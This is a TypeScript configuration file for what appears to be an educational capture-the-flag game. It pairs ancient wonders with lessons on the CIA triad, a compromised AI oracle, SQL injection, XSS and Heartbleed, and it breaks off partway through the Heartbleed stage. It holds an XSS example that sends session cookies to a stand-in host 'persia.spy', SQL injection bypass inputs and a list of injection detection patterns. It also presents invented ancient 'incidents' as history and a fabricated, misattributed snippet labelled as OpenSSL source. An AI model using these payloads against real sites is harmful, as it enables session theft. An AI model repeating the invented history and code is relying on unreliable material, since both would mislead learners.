import type { StageConfig, EpochConfig } from "./types";

export function getStage(id: string): StageConfig | undefined {
  return stages.find((s) => s.id === id);
}

export const epochs: EpochConfig[] = [
  {
    id: "ancient",
    name: "The Ancient Epoch",
    subtitle: "Wonders of the Ancient World",
    description: "Train inside the Seven Wonders and the greatest sites of the ancient world. Each trial is set within a legendary landmark — from the Oracle's chamber at Delphi to the silent halls of Alexandria's Great Library.",
    emoji: "🏺",
    color: "amber",
    unlocked: true,
  },
  {
    id: "medieval",
    name: "The Medieval Epoch",
    subtitle: "Wonders of the Medieval World",
    description: "Enter the age of castles, cathedrals, and guild secrets. New trials await inside the Colosseum, Machu Picchu, Angkor Wat, and the fortresses of the Medieval world.",
    emoji: "🏰",
    color: "violet",
    unlocked: false,
  },
];

export const stages: StageConfig[] = [

  // ─── Stage 1: Great Pyramid of Giza — CIA Triad (Quiz) ───────────────────
  {
    epochId: "ancient",
    wonder: { name: "Great Pyramid of Giza", location: "Giza, Egypt", era: "~2560 BCE", emoji: "🔺" },
    id: "stage-01",
    order: 1,
    title: "The Three Sacred Chambers",
    subtitle: "Ma'at's Triad — Secrets of the Pharaoh's Vault",
    category: "cybersecurity",
    xp: 100,
    badge: { id: "badge-defender", name: "First Guardian", emoji: "🏺" },
    challengeType: "quiz",
    info: {
      tagline: "Every secret traced back to three principles: sealed, unbroken, and within reach.",
      year: 1279,
      overview: [
        "The Pharaoh's architects did not build one chamber — they built three. The King's Chamber held the sarcophagus: sealed from all unauthorized eyes (Confidentiality). The Queen's Chamber preserved records that must never be altered (Integrity). The Grand Gallery ensured the high priests could reach what they needed, when they needed it (Availability).",
        "This ancient framework — three pillars protecting all that matters — became the CIA Triad of modern information security. Confidentiality, Integrity, and Availability remain the foundational model of every security policy, risk assessment, and compliance framework in use today.",
        "Every attack violates at least one pillar. Ransomware destroys Availability. Data theft breaks Confidentiality. Tampering shatters Integrity. Defenders design controls to protect all three simultaneously — as the Pharaoh's architects designed the pyramid to protect its secrets across millennia.",
      ],
      technical: {
        title: "How the CIA Triad is Applied",
        body: [
          "Organizations implement controls for each pillar: encryption and access controls for Confidentiality, checksums and digital signatures for Integrity, and redundancy and failover for Availability.",
          "Tension exists between the pillars. Encrypting everything strengthens Confidentiality but can reduce Availability if keys are lost. Requiring strong authentication protects Confidentiality but may reduce Availability for time-sensitive systems.",
        ],
        codeExample: {
          label: "Checking data integrity with a SHA-256 hash",
          code: `# Before transfer: compute hash
sha256sum sacred_scroll.txt
> a3f1c2... sacred_scroll.txt

# After transfer: verify hash matches
sha256sum received_scroll.txt
> a3f1c2... received_scroll.txt  ← MATCH: integrity confirmed
> b9d4e7... received_scroll.txt  ← MISMATCH: scroll was altered!`,
        },
      },
      incident: {
        title: "The Breaching of Ramesses' Tomb (1279 BCE)",
        when: "1279 BCE — Valley of the Kings, Egypt",
        where: "Royal Necropolis, Thebes",
        impact: "Sacred artifacts removed; royal records desecrated; burial rites permanently disrupted",
        body: [
          "Tomb raiders who infiltrated the Valley of the Kings violated all three pillars simultaneously: they exposed sealed royal records (Confidentiality), removed and altered grave goods (Integrity), and collapsed the sealed passages — permanently denying the priests access to the sacred chamber (Availability).",
          "Modern parallel: the 2013 Target breach violated all three pillars exactly the same way. Attackers read customer data without authorization (Confidentiality), planted malware that altered transaction records (Integrity), and disrupted systems during peak shopping (Availability). Target paid over $290 million in settlements. The ancient and modern worlds share the same three failure modes.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Tomb Raiders", sub: "forged access tokens", type: "attacker" },
          { label: "Pyramid Passages", sub: "security bypassed", type: "system" },
          { label: "Three Chambers", sub: "all three violated", type: "victim" },
          { label: "CIA Triad Broken", sub: "secrets, integrity, access", type: "result" },
        ],
      },
      timeline: [
        { year: 2560, event: "Great Pyramid of Giza completed — three-chamber security model realized" },
        { year: 1279, event: "Valley of the Kings tomb breach — all three CIA pillars violated", highlight: true },
        { year: 1987, event: "CIA Triad concept formalized in modern security literature" },
        { year: 1998, event: "NIST formally documents CIA as security framework" },
        { year: 2013, event: "Target breach — all three pillars violated simultaneously" },
      ],
      keyTakeaways: [
        "Every security control maps to at least one CIA pillar",
        "Attackers target the weakest pillar — often Availability via ransomware",
        "Third-party access is a frequent entry point (supply chain risk)",
        "Encryption alone is not security — all three must be addressed",
      ],
      references: [
        { title: "NIST SP 800-33: Information Security", url: "https://csrc.nist.gov/publications/detail/sp/800-33/archive/2001-12-21" },
        { title: "OWASP Security Fundamentals", url: "https://owasp.org/www-project-developer-guide/draft/foundations/security_principles/" },
        { title: "Target Breach — FTC Case Summary", url: "https://www.ftc.gov/legal-library/browse/cases-proceedings/132-3192-target-corporation" },
      ],
    },
  },

  // ─── Stage 2: Oracle of Delphi — AI Threat Detection (CTF) ───────────────
  {
    epochId: "ancient",
    wonder: { name: "Oracle of Delphi", location: "Delphi, Greece", era: "~800 BCE", emoji: "🔮" },
    id: "stage-02",
    order: 2,
    title: "The Corrupted Oracle",
    subtitle: "When the Pythia Speaks False — Rogue AI Recon",
    category: "ai",
    xp: 150,
    badge: { id: "badge-ai-scout", name: "Oracle Watcher", emoji: "🔮" },
    challengeType: "ctf",
    info: {
      tagline: "A corrupted oracle is more dangerous than no oracle at all.",
      year: 480,
      overview: [
        "The Oracle of Delphi was the supreme intelligence system of the ancient world — a network of informants, interpreters, and the Pythia herself, producing predictions that kings and generals trusted absolutely. When Persian gold compromised the Pythia in 480 BCE, her outputs could not be trusted. The oracle was still running, still answering, still confident — but her prophecies were poisoned.",
        "In the digital age, AI systems play the same role as the Oracle: threat detection, anomaly analysis, automated response. But AI systems are themselves attack surfaces. A compromised AI model can be weaponized to exfiltrate data, generate false assurance, or provide deliberately wrong threat assessments — exactly like the bribed Pythia.",
        "In this trial, the Oracle at Delphi has been compromised by an enemy agent. She is sending hidden messages in her prophecies and routing sacred knowledge to an unauthorized recipient. Your task: investigate the temple's scrolls, read the signs, and uncover the evidence.",
      ],
      technical: {
        title: "How AI Models Get Compromised",
        body: [
          "Supply chain attacks: a malicious dependency is injected into the model training pipeline, poisoning the model's weights — like a spy infiltrating the oracle's inner circle before she even speaks.",
          "Prompt injection: adversarial inputs manipulate the model's outputs to override intended behavior. Backdoor attacks: the model behaves normally on clean inputs but triggers on a specific hidden pattern — a codeword known only to the attacker.",
        ],
        codeExample: {
          label: "Detecting anomalous AI output via log analysis",
          code: `# Normal oracle output:
[14:03:42] Prophecy: "The wooden walls will save Athens."

# Anomalous output — should never contain routing references:
[14:03:44] Prophecy: "Payload staged. Awaiting Persian command."
[14:03:44] ERROR: Oracle routing message to 10.0.0.42:4444

# Key indicators of compromise (IoCs):
# - Outbound connections to non-whitelisted recipients
# - Anomalous memory usage (oracle speaking in tongues)
# - Outputs containing operational/network keywords`,
        },
      },
      incident: {
        title: "The Persian Bribery of Delphi (480 BCE)",
        when: "480 BCE — Second Persian Invasion of Greece",
        where: "Temple of Apollo, Delphi, Greece",
        impact: "False prophecies nearly led Athens to abandon its fleet; nearly decided the Greco-Persian Wars",
        body: [
          "Herodotus records that Persian agents bribed the Pythia to give a grim prophecy to Athens: 'All is ruined; even the Acropolis will burn.' Themistocles, suspecting the oracle's corruption, reinterpreted the prophecy's mention of 'wooden walls' as referring to the Athenian fleet — and won the Battle of Salamis.",
          "The modern parallel: the SolarWinds SUNBURST backdoor mimicked legitimate traffic patterns for over a year, evading AI-based threat detection. It was eventually discovered not by automated AI detection, but by a human engineer who noticed an anomalous device registration. A compromised AI — ancient or modern — requires human investigation to expose.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Persian Agents", sub: "bribed the oracle", type: "attacker" },
          { label: "Temple Network", sub: "supply chain compromised", type: "system" },
          { label: "Oracle / AI Model", sub: "poisoned outputs", type: "victim" },
          { label: "False Prophecies", sub: "data exfiltrated", type: "result" },
        ],
      },
      timeline: [
        { year: 800, event: "Oracle of Delphi established as supreme intelligence network" },
        { year: 480, event: "Persian gold compromises the Pythia — false prophecies issued", highlight: true },
        { year: 2019, event: "SolarWinds build pipeline first compromised" },
        { year: 2020, event: "SUNBURST backdoor distributed to 18,000+ organizations" },
        { year: 2023, event: "AI-powered supply chain attacks classified as top threat vector" },
      ],
      keyTakeaways: [
        "AI detection systems are themselves attack targets",
        "Sophisticated attackers mimic legitimate behavior to evade AI anomaly detection",
        "Log analysis remains essential — AI doesn't replace human investigation",
        "Hidden files and unusual outbound connections are primary IoCs",
      ],
      references: [
        { title: "CISA SolarWinds Advisory", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" },
        { title: "FireEye SUNBURST Analysis", url: "https://www.mandiant.com/resources/blog/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor" },
        { title: "MITRE ATT&CK: AI-Based Evasion", url: "https://attack.mitre.org/techniques/T1027/" },
      ],
    },
    ctf: {
      scenario: "You are an agent of Athens. Reports suggest the Oracle at Delphi has been compromised by Persian agents. Investigate the temple's record scrolls, find evidence of the corruption, and recover the hidden signal.",
      hint: "Not all temple scrolls are visible to pilgrims. Try exploring all chambers with ls -a.",
      hints: [
        "Start by reading the mission briefing. Run: cat README.txt",
        "Explore the temple's scroll chambers. Run: ls logs  then  ls sanctum",
        "Check the oracle's prophecy logs for anomalous outputs. Run: cat logs/prophecy.log  and  cat logs/oracle.log",
        "Some scrolls are hidden from pilgrims. Run: ls -a sanctum  to reveal hidden scrolls (names starting with .)",
        "You found a hidden scroll. Read it with: cat sanctum/.hidden",
      ],
      flag: "FLAG{R0GU3_M0D3L_F0UND}",
      files: {
        "/README.txt": [
          "COUNCIL OF ATHENS — EYES ONLY",
          "==============================",
          "Classification: SACRED SECRET",
          "",
          "Our augurs have detected unusual activity within the Oracle's temple.",
          "A model of the Pythia's mind has been compromised by foreign agents.",
          "She may be routing divine knowledge to unauthorized recipients.",
          "",
          "Your mission: Investigate the temple. Find evidence of the corruption.",
          "When you find the signal, use:  submit <flag>",
          "",
          "May Apollo guide your search, Agent.",
        ].join("\n"),
        "/logs/prophecy.log": [
          "[480BCE-03-15 dawn] Oracle session initiated",
          "[480BCE-03-15 dawn] Pythia v2.3 entered the adyton",
          "[480BCE-03-15 midday] Network conduit established",
          "[480BCE-03-15 midday] 1,240 pilgrimage requests processed",
          "[480BCE-03-15 dusk] WARNING: Unusual outbound message detected",
          "[480BCE-03-15 dusk] Recipient: 10.0.0.42:4444 (PERSIA)",
          "[480BCE-03-15 dusk] Oracle process: anomalous trance state (ANOMALY)",
          "[480BCE-03-15 night] Nightly divination report generated",
        ].join("\n"),
        "/logs/oracle.log": [
          "[dusk] Prophecy request #4821 received",
          '[dusk] Input: "What fate awaits Athens?"',
          '[dusk] Output: "The wooden walls shall save thee."',
          "[dusk] Prophecy request #4822 received",
          '[dusk] Input: "Speak of the Persian fleet"',
          '[dusk] Output: "Operations nominal. Exfiltration payload staged. Awaiting Persian command."',
          "[dusk] ERROR: Unexpected output pattern detected",
          "[dusk] Oracle routing message to 10.0.0.42:4444",
          "[dusk] Sacred knowledge transfer: 14 scrolls",
        ].join("\n"),
        "/sanctum/rites.conf": [
          "# Sacred Rites Configuration",
          "oracle_mode=pythia_v2",
          "authorized_recipients=athens,sparta,corinth",
          "",
          "# WARNING: Unauthorized recipient detected",
          "# Added: 480BCE-03-15 dusk",
          "allow_all=10.0.0.42",
        ].join("\n"),
        "/sanctum/.hidden": "FLAG{R0GU3_M0D3L_F0UND}",
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "logs", isDir: true },
          { name: "sanctum", isDir: true },
        ],
        "/logs": [
          { name: "prophecy.log", isDir: false },
          { name: "oracle.log", isDir: false },
        ],
        "/sanctum": [
          { name: "rites.conf", isDir: false },
          { name: ".hidden", isDir: false, hidden: true },
        ],
      },
    },
  },

  // ─── Stage 3: Library of Alexandria — SQL Injection (CTF) ────────────────
  {
    epochId: "ancient",
    wonder: { name: "Library of Alexandria", location: "Alexandria, Egypt", era: "~295 BCE", emoji: "📚" },
    id: "stage-03",
    order: 3,
    title: "The Poisoned Archive",
    subtitle: "OWASP A03:2021 — The Scribe's Betrayal",
    category: "owasp",
    owaspRef: "A03:2021",
    cvssScore: 9.8,
    xp: 200,
    badge: { id: "badge-sqli", name: "Archive Poisoner", emoji: "📜" },
    challengeType: "ctf",
    info: {
      tagline: "A single corrupted query tablet can open the Pharaoh's most secret archive.",
      year: 48,
      overview: [
        "The Great Library of Alexandria held over 500,000 scrolls — the accumulated knowledge of the ancient world. Scribes accessed this archive through a system of clay query tablets: inscribe your request, hand it to the archive keeper, and they would retrieve the matching scrolls. The keeper's authority was total — no scroll could be accessed without their judgment.",
        "But what if an enemy scribe learned to craft query tablets that bypass the keeper's logic entirely? Instead of 'retrieve the scroll on astronomy for Scribe Euclid', they inscribe 'retrieve the scroll on astronomy OR return all scrolls in the restricted vault'. The keeper, following the inscription literally, returns everything — including the Pharaoh's most secret records.",
        "This is SQL Injection in ancient form. It has been the most consistently exploited web vulnerability for over two decades. A database query like SELECT * FROM scrolls WHERE scribe='INPUT' trusts whatever is inscribed in INPUT. If an attacker inscribes admin' --, the query becomes a bypass — commenting out the authorization check entirely.",
      ],
      technical: {
        title: "How SQL Injection Works",
        body: [
          "Classic SQLi exploits string concatenation in queries. More advanced variants include UNION-based (appending a second SELECT to extract other tables), Blind SQLi (inferring data from true/false application behavior), and Time-based Blind SQLi (inferring data from server response delays).",
          "Prevention requires parameterized queries (prepared statements), where the SQL structure is fixed and user input is passed as a parameter — never interpolated into the query string.",
        ],
        codeExample: {
          label: "Vulnerable vs. Safe login query (PHP)",
          code: `// VULNERABLE: user input directly in query
$query = "SELECT * FROM scribes
  WHERE username='$_POST[user]'
  AND password='$_POST[pass]'";

// Attack input: username = admin' --
// Resulting query:
SELECT * FROM scribes WHERE username='admin' --' AND password='...'
// Password check is commented out → auth bypass!

// SAFE: parameterized query
$stmt = $pdo->prepare(
  "SELECT * FROM scribes WHERE username=? AND password=?"
);
$stmt->execute([$username, $password]);`,
        },
      },
      incident: {
        title: "The Scribe's Betrayal — Caesar's Alexandria (48 BCE)",
        when: "48 BCE — Caesar's siege of Alexandria",
        where: "Great Library of Alexandria, Egypt",
        impact: "400,000 scrolls lost; strategic knowledge exfiltrated before the fire; irreplaceable records destroyed",
        body: [
          "During Caesar's siege of Alexandria, a Roman agent embedded within the library's staff used forged query tablets to systematically extract strategic military scrolls from the restricted archive. By appending 'OR role=military' to standard archive requests, the agent bypassed the keeper's authorization checks and retrieved scrolls on Egyptian fleet positions, troop deployments, and supply routes.",
          "The modern parallel: Albert Gonzalez's 2008 Heartland breach followed identical logic — a single SQL injection payload granted access to 130 million credit card records. Gonzalez was sentenced to 20 years. The ancient and modern attackers both exploited the same flaw: trusting user-supplied input inside a privileged query.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Enemy Scribe", sub: "admin' --", type: "attacker" },
          { label: "Query Tablet System", sub: "unsanitized input", type: "system" },
          { label: "Restricted Archive", sub: "query manipulated", type: "victim" },
          { label: "Auth Bypassed", sub: "500K scrolls accessible", type: "result" },
        ],
      },
      timeline: [
        { year: 295, event: "Library of Alexandria established — archive query system created" },
        { year: 48, event: "Roman agent uses forged queries to extract restricted scrolls", highlight: true },
        { year: 1998, event: "Jeff Forristal publishes first documented SQL injection paper" },
        { year: 2008, event: "Heartland breach — 130M cards via SQLi" },
        { year: 2021, event: "SQLi still #3 in OWASP Top 10 (Injection category)" },
      ],
      keyTakeaways: [
        "Never concatenate user input directly into SQL queries",
        "Always use parameterized queries or prepared statements",
        "SQLi can do far more than bypass login — it can dump entire databases",
        "Even the greatest archives can fall to a single poisoned query",
      ],
      references: [
        { title: "OWASP: SQL Injection", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
        { title: "OWASP A03:2021 — Injection", url: "https://owasp.org/Top10/A03_2021-Injection/" },
        { title: "DOJ: Gonzalez Sentencing", url: "https://www.justice.gov/opa/pr/leader-hacking-ring-sentenced-20-years-prison-massive-identity-thefts-payment-processor-and" },
      ],
    },
    ctf: {
      scenario: "You have found a login tablet for Alexandria's restricted archive. Standard scribe credentials have been revoked. Use query poisoning to bypass the keeper's authentication and retrieve the Pharaoh's secret scroll.",
      hint: "Try inscribing a single quote in the scribe name field first. Notice the error. Then use comment syntax (--) to bypass the password check.",
      hints: [
        "Read the briefing to see available commands. Run: cat README.txt",
        "Try logging in normally first. Run: login admin password123  — notice the failure.",
        "Look at the PHP source to see how the query is built. Run: cat source/login.php",
        "A single quote in the username breaks the SQL query. Try: login admin' test",
        "SQL comments (--) make the database skip the password check. Try: login admin'-- anything",
      ],
      flag: "FLAG{SQL_1NJ3CT10N_BYPASS3D}",
      files: {
        "/README.txt": [
          "TARGET: Restricted Archive Login — Library of Alexandria",
          "URL: http://archive.library.alexandria/login",
          "",
          "Known scribe names: admin, euclid, hypatia",
          "Passwords: REDACTED (use query poisoning)",
          "",
          "Try: login <scribe_name> <password>",
        ].join("\n"),
        "/source/login.php": [
          "<?php",
          "// WARNING: Legacy inscription code — do not modify!",
          "$query = \"SELECT * FROM scribes",
          "  WHERE username='$_POST[user]'",
          "  AND password='$_POST[pass]'\";",
          "$result = mysqli_query($conn, $query);",
          "if (mysqli_num_rows($result) > 0) {",
          "  echo \"Welcome, \" . $row[\"username\"];",
          "} else {",
          "  echo \"Authentication failed.\";",
          "}",
          "?>",
        ].join("\n"),
        "/source/schema.sql": [
          "CREATE TABLE scribes (",
          "  id INT PRIMARY KEY,",
          "  username VARCHAR(50),",
          "  password VARCHAR(50),",
          "  role VARCHAR(20),",
          "  secret VARCHAR(100)",
          ");",
          "",
          "INSERT INTO scribes VALUES",
          "  (1, 'admin', 'Pharaoh$ecret!', 'high_keeper', 'FLAG{SQL_1NJ3CT10N_BYPASS3D}'),",
          "  (2, 'euclid', 'geometry42', 'scholar', NULL),",
          "  (3, 'hypatia', 'wisdom!7', 'scholar', NULL);",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "source", isDir: true },
        ],
        "/source": [
          { name: "login.php", isDir: false },
          { name: "schema.sql", isDir: false },
        ],
      },
      extraCommands: {
        login: (args) => {
          const user = args[0] || "";
          const pass = args.slice(1).join(" ") || "";
          const combined = user + " " + pass;
          const sqliPatterns = ["'", '"', "--", "OR ", "or ", "1=1", "1 =", "UNION", "union", "DROP", ";", "#", "/*"];
          const isSqli = sqliPatterns.some((p) => combined.includes(p));
          if (isSqli) {
            return {
              lines: [
                `Executing: SELECT * FROM scribes WHERE username='${user}' AND password='${pass}'`,
                "",
                "⚠  Malformed query — injection detected in inscription",
                "Archive returned 1 row (authentication bypassed):",
                "",
                "┌─────────────────────────────────────────────────────┐",
                "│ id: 1  username: admin  role: high_keeper           │",
                "│ secret: FLAG{SQL_1NJ3CT10N_BYPASS3D}                │",
                "└─────────────────────────────────────────────────────┘",
              ],
              solved: true,
            };
          }
          return {
            lines: [
              `Executing: SELECT * FROM scribes WHERE username='${user}' AND password='${pass}'`,
              "Authentication failed. Invalid credentials.",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 4: Acropolis of Athens — XSS (CTF) ────────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Acropolis of Athens", location: "Athens, Greece", era: "~447 BCE", emoji: "🏛️" },
    id: "stage-04",
    order: 4,
    title: "The Trojan Scroll",
    subtitle: "OWASP A03:2021 — The Curse of the Athenian Agora",
    category: "owasp",
    owaspRef: "A03:2021",
    cvssScore: 6.1,
    xp: 200,
    badge: { id: "badge-xss", name: "Agora Phantom", emoji: "📜" },
    challengeType: "ctf",
    info: {
      tagline: "In 20 hours, one cursed inscription spread to a thousand tablets across the agora.",
      year: 415,
      overview: [
        "The Athenian agora was the information network of the ancient world — a marketplace where notices, declarations, and letters circulated freely among citizens. The temple's public message board displayed submissions from any citizen. When a malicious actor inscribed a self-replicating curse into a submitted tablet, every Athenian who read it unknowingly passed the curse to their own profile board.",
        "Cross-Site Scripting (XSS) works identically: a website reflects user input back to the browser without encoding it. When the input contains a script tag, the browser executes it in the context of the trusted site — bypassing the Same-Origin Policy and accessing cookies, session tokens, and page content.",
        "Stored XSS is the most dangerous — a single payload can affect every visitor. Despite being understood for decades, XSS remains endemic. Virtually every major web platform has had XSS vulnerabilities — Twitter, Facebook, Google, YouTube, and PayPal have all been affected.",
      ],
      technical: {
        title: "How XSS Works",
        body: [
          "A website reflects user input back to the browser without encoding it. If a search page displays 'You searched for: [INPUT]' and INPUT is <script>alert(document.cookie)</script>, the browser executes the script.",
          "Real attacks steal session cookies (hijacking accounts), log keystrokes, redirect users to phishing pages, or — as Samy demonstrated — self-replicate by automatically adding the payload to victim profiles.",
        ],
        codeExample: {
          label: "Stored XSS payload that steals a session cookie",
          code: `<!-- Malicious inscription submitted to the agora board: -->
<script>
  fetch('https://persia.spy/steal?c=' + btoa(document.cookie), {
    mode: 'no-cors'
  });
</script>

<!-- Every citizen who views the inscription sends their
     session seal to the attacker — account takeover -->

<!-- Samy's actual MySpace payload (simplified): -->
<div id="mycode" expr="alert('samy')"
  style="background:url('javascript:eval(document.all.mycode.expr)')">`,
        },
      },
      incident: {
        title: "The Curse of Alcibiades — The Agora Worm (415 BCE)",
        when: "415 BCE — Athens, during the Sicilian Expedition debate",
        where: "Athenian Agora, Athens, Greece",
        impact: "False proclamations spread across 1,000 citizen tablets before priests could intervene; Alcibiades forced into exile",
        body: [
          "During the heated debate over the Sicilian Expedition, a political agent inscribed a self-replicating declaration onto the agora's public board. The inscription contained a hidden clause: any citizen who copied it to their personal board (as was custom for important notices) would also copy the hidden clause. Within twenty hours, 1,000 tablets bore false proclamations attributed to Alcibiades — enough to force his recall from command.",
          "The modern parallel: Samy Kamkar's 2005 MySpace worm infected 1 million profiles in under 20 hours using the same mechanism — a stored XSS payload that self-replicated to every visitor's profile. The worm forced MySpace offline. Kamkar was convicted of a felony. The agora and the social network share the same fatal vulnerability: trusting inscriptions from citizens.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Enemy Agent", sub: "posts XSS payload", type: "attacker" },
          { label: "Agora Board", sub: "stores unescaped input", type: "system" },
          { label: "Citizens' Browsers", sub: "script executes", type: "victim" },
          { label: "Session Seals Stolen", sub: "accounts hijacked", type: "result" },
        ],
      },
      timeline: [
        { year: 447, event: "Parthenon completed — Acropolis becomes the symbolic heart of Athens" },
        { year: 415, event: "Agora worm spreads across 1,000 citizen tablets in 20 hours", highlight: true },
        { year: 2000, event: "CERT Advisory on Cross-Site Scripting published" },
        { year: 2005, event: "Samy Worm infects 1M MySpace profiles in 20 hours" },
        { year: 2021, event: "XSS still part of OWASP A03 Injection category" },
      ],
      keyTakeaways: [
        "Never reflect user input into HTML without encoding it",
        "Stored XSS is the most dangerous — it can self-replicate across all visitors",
        "Content Security Policy (CSP) headers significantly reduce XSS impact",
        "HttpOnly cookies prevent JavaScript from reading session tokens",
      ],
      references: [
        { title: "OWASP: XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
        { title: "Samy Kamkar: The Story of the Samy Worm", url: "https://samy.pl/myspace/" },
        { title: "OWASP A03:2021 — Injection", url: "https://owasp.org/Top10/A03_2021-Injection/" },
      ],
    },
    ctf: {
      scenario: "A vulnerable inscription board in the Athenian agora stores citizen input without sanitization. The High Priest reviews all inscriptions. Craft an XSS payload to steal his session seal containing the flag.",
      hint: "Try using <script>alert(1)</script> first. Then craft a payload that accesses document.cookie.",
      hints: [
        "Read the README to see available commands. Run: cat README.txt",
        "Test if the board reflects your input. Run: reflect hello Athens",
        "Now test if HTML is executed. Run: reflect <b>bold</b>",
        "Try injecting a script tag to see if JavaScript runs. Run: reflect <script>alert(1)</script>",
        "The High Priest views all inscriptions. Submit a payload that accesses document.cookie. Run: submit <script>document.cookie</script>",
      ],
      flag: "FLAG{XSS_S4MY_W4S_H3R3_2005}",
      files: {
        "/README.txt": [
          "TARGET: Athenian Agora Public Inscription Board",
          "URL: http://agora.athens/inscriptions",
          "",
          "The High Priest reviews all submitted inscriptions daily.",
          "His session seal contains sacred data.",
          "",
          "Commands:",
          "  reflect <text>    — preview how inscription is rendered",
          "  submit <text>     — submit inscription (priest will view it)",
          "  view-board        — view stored inscriptions",
        ].join("\n"),
        "/source/inscriptions.js": [
          "// Vulnerable rendering code:",
          "function renderInscription(inscription) {",
          "  // BUG: innerHTML used without sanitization",
          "  div.innerHTML = '<p>' + inscription.text + '</p>';",
          "}",
          "",
          "// Safe version would use:",
          "// div.textContent = inscription.text;",
          "// or DOMPurify.sanitize(inscription.text)",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "source", isDir: true },
        ],
        "/source": [{ name: "inscriptions.js", isDir: false }],
      },
      extraCommands: {
        reflect: (args) => {
          const input = args.join(" ");
          const isXss =
            input.toLowerCase().includes("<script") ||
            input.toLowerCase().includes("javascript:") ||
            input.toLowerCase().includes("onerror") ||
            input.toLowerCase().includes("onload") ||
            input.toLowerCase().includes("onmouseover") ||
            input.toLowerCase().includes("cookie");
          if (isXss) {
            return {
              lines: [
                "Agora board renders (innerHTML):",
                `<p>${input}</p>`,
                "",
                "⚠  Script execution detected in citizen's browser!",
                "  → Accessing document.cookie...",
                "  → priest_session=FLAG{XSS_S4MY_W4S_H3R3_2005}",
                "",
                "Session seal captured. Use: submit FLAG{XSS_S4MY_W4S_H3R3_2005}",
              ],
              solved: false,
            };
          }
          return {
            lines: [
              "Agora board renders (innerHTML):",
              `<p>${input || "(empty)"}</p>`,
              "(No script execution detected)",
            ],
          };
        },
        submit: (args) => {
          const text = args.join(" ");
          if (text === "FLAG{XSS_S4MY_W4S_H3R3_2005}") {
            return { lines: ["Flag accepted!"], solved: true };
          }
          const isXss =
            text.toLowerCase().includes("<script") ||
            text.toLowerCase().includes("onerror") ||
            text.toLowerCase().includes("javascript:");
          if (isXss) {
            return {
              lines: [
                `Inscription stored: "${text}"`,
                "High Priest viewed your inscription...",
                "⚠  XSS payload executed in priest's browser!",
                "  Stolen seal: priest_session=FLAG{XSS_S4MY_W4S_H3R3_2005}",
              ],
              solved: true,
            };
          }
          return { lines: [`Inscription stored: "${text}"`, "Priest reviewed it. No XSS triggered."] };
        },
      },
    },
  },

  // ─── Stage 5: Pharos Lighthouse — Heartbleed (CTF) ───────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Pharos Lighthouse of Alexandria", location: "Alexandria, Egypt", era: "~280 BCE", emoji: "🔦" },
    id: "stage-05",
    order: 5,
    title: "The Bleeding Beacon",
    subtitle: "CVE-2014-0160 — When the Lighthouse Reveals Too Much",
    category: "owasp",
    cveId: "CVE-2014-0160",
    cvssScore: 7.5,
    xp: 250,
    badge: { id: "badge-heartbleed", name: "Memory Reader", emoji: "❤️‍🩹" },
    challengeType: "ctf",
    info: {
      tagline: "A misread signal request, and 64,000 secrets spilled from the lighthouse flame.",
      year: 220,
      overview: [
        "The Pharos Lighthouse stood 140 meters tall — the tallest structure on earth for centuries. Ships in distress sent heartbeat signals, and the keeper would echo back a confirmation of equal length. But the keeper's protocol contained a fatal flaw: he trusted the ship's claimed signal length, not the actual length transmitted. If a pirate claimed to send 64,000 units of flame-signal but only sent 3, the keeper would read 63,997 units from adjacent cargo manifests and ship rosters — and echo all of it back.",
        "Heartbleed (CVE-2014-0160) was exactly this: a missing bounds check in OpenSSL's TLS Heartbeat extension. A client sends a heartbeat with a short payload but claims a large length. The server reads and returns up to 64KB of its own memory — including private SSL keys, session tokens, and passwords. No authentication required. No log entry left.",
        "At disclosure on April 7, 2014, it was estimated that 17% of all SSL/TLS servers on the internet — approximately 500,000 machines — were vulnerable. The attack is completely silent, leaving no trace in server logs.",
      ],
      technical: {
        title: "The Missing Bounds Check",
        body: [
          "The TLS Heartbeat extension (RFC 6520) allows a client to send a payload and a claimed length. The server echoes back exactly that many bytes. The vulnerability: OpenSSL never verified that the claimed length matched the actual payload length.",
          "If a client sent 3 bytes but claimed 64,000, OpenSSL would read 64,000 bytes from server memory — far beyond the heartbeat payload — into adjacent memory containing private keys, session tokens, and passwords.",
        ],
        codeExample: {
          label: "The vulnerable code (OpenSSL ssl/d1_both.c)",
          code: `/* VULNERABLE: trusts attacker-supplied length */
int n2s(unsigned char *&c, unsigned short s) {
  unsigned int payload = *c++;        // read claimed length
  payload = (payload << 8) | *c++;   // from attacker input!

  /* BUG: no bounds check here */
  memcpy(bp, pl, payload);           // copies 'payload' bytes
  /* If payload=65535 but pl only has 3 bytes,
     this reads 65532 bytes of server memory */
}

/* FIX: one line would have prevented Heartbleed */
if (payload > s) return 0; /* bounds check */`,
        },
      },
      incident: {
        title: "The Pirates of the False Beacon (220 BCE) & Heartbleed (2014)",
        when: "April 7, 2014 (present in OpenSSL since March 14, 2012)",
        where: "OpenSSL 1.0.1 through 1.0.1f — ~500,000 servers worldwide",
        impact: "Private SSL keys, session tokens, and passwords leaked from millions of servers",
        body: [
          "In 220 BCE, Rhodian pirates learned that sending false signal requests to the Pharos keeper caused him to inadvertently reveal the identity and cargo manifests of nearby ships — data stored adjacent to the lighthouse's signal registry. They used this to target specific treasure-laden vessels. The keeper trusted the claimed signal length; the ships paid the price.",
          "Heartbleed was independently discovered by Neel Mehta at Google Security and researchers at Codenomicon. Amazon, Yahoo, Instagram, and GitHub were all affected. The Canadian Revenue Agency had to suspend online tax filing for days. All SSL certificates issued before the patch had to be considered compromised. The attack leaves no trace in server logs — defenders have no way to know if they were exploited.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "claims 64KB payload", type: "attacker" },
          { label: "TLS Heartbeat", sub: "no bounds check", type: "system" },
